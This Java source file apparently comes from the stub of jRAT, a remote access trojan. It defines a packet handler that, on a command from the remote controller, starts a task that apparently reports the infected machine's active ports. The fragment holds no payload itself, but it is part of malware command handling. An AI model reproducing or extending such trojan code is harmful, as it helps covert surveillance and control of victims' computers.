package se.jrat.stub.packets.incoming;

import se.jrat.stub.ActivePorts;
import se.jrat.stub.Connection;

public class Packet73ActivePorts extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		new ActivePorts(con).start();
	}

}
